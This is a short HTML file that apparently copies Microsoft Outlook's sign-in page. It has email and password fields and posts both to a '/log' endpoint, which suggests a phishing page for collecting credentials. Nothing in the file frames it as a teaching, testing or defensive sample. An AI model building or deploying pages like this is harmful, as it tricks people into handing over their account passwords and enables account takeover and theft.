<!DOCTYPE html>
<html>
<head>
  <title>Outlook Sign In</title>
  <link rel="stylesheet" href="/Outlook/style.css">
</head>
<body>
  <div class="box">
    <h2>Sign in</h2>
    <form action="/log" method="POST">
      <input type="text" name="email" placeholder="Email, phone, or Skype" required><br>
      <input type="password" name="pass" placeholder="Password" required><br>
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
